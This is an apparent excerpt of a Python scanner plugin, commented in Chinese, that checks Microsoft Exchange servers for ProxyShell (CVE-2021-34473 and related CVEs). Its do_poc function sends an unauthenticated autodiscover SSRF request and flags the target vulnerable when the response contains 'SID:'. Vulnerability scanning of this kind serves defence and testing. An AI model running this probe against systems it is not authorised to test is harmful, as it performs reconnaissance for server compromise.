...
def vuln_info():
    info = {
        'vuln_name': 'Exchange ProxyShell',  # 漏洞名称
        'vuln_referer': 'https://blog.csdn.net/qq_41874930/article/details/120037619',  # 漏洞来源
        'vuln_author': 'YaoXin',  # 插件作者
        'cms_name': 'Exchange',  # cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description': '''漏洞描述：使用 ProxyShell，未经身份验证的攻击者可以通过暴露的 443 端口在 Microsoft Exchange Server 上执行任意命令。  注意：复现需要使用公网VPS配合。''',
        'vuln_identifier': '''漏洞编号：CVE-2021-34473、CVE-2021-34523、CVE-2021-31207''',
        'vuln_class': '漏洞分类',
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    try:
        ...
        ###########################################################################################################
        res = requests.get(url=url + "/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com", headers=headers, verify=False, timeout=3)
        if "SID:" in res.text:
            result['Result'] = True
        return result
